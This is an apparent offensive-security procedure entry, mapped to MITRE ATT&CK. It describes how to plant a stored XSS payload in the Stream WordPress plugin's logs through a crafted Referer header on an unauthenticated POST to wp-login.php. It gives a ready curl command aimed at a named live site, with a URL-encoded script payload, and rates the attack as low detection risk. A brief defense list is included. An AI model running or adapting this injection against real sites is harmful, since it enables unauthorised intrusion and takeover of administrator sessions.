---
id: proc-inject-xss-referer
tags:
  - xss
  - injection
  - wordpress
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-inject-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:28.929Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-XSS-Payload-via-Crafted-Referer

## Summary

This procedure exploits a lack of sanitization in the Stream WordPress plugin's logging of wp_redirect hooks, injecting a stored XSS payload via the 'file' query parameter in a crafted Referer header during an unauthenticated POST request to wp-login.php.

## Description

In the Stream plugin (e.g., version 1.4.9), the connectors/installer.php file logs redirect details including query parameters without proper escaping. By sending a POST to wp-login.php?action=postpass with a malicious Referer URL like '/hello?plugin-editor.php&file=<script>alert('stored xss');</script>', the redirect logs the unsanitized 'file' value to the database. This payload persists and executes when an admin views the log in the dashboard, potentially allowing site control. Prerequisites include network access to the target WordPress site; no authentication is needed.

## Requirements

1. Network access to the target WordPress site's wp-login.php endpoint
2. [[tools/curl]] installed for sending HTTP requests
3. Knowledge of the target URL (e.g., https://newsroom.uber.com)

## Defense

Defensive measures and detection strategies:

- Sanitize all logged query parameters with HTML escaping (e.g., esc_html() in WordPress)
- Implement Content Security Policy (CSP) to restrict inline script execution
- Monitor admin log views for anomalous JavaScript execution via browser dev tools or WAF logs

## Objectives

1. Store malicious JavaScript in the Stream log database table
2. Ensure payload evasion of basic URL encoding checks
3. Set up for admin-context execution without direct access

## Instructions

### Step 1: Craft and Send Injection Request

**Context**: Prepare a POST request to trigger the postpass action, which redirects to the Referer and logs its parameters unsanitized.

**Command** ([[commands/curl-inject-xss]]):
```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'
```

> This command sends verbose output (-v), sets a custom Referer header with URL-encoded XSS payload (%3cscript%3e for <script>, etc.), and POSTs dummy data to initiate the redirect. Expected output includes HTTP headers and a 302 status, confirming the log entry creation in the Stream table.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss]]

## Tools Used

- [[tools/curl]]

## Tags

- xss
- injection
- wordpress
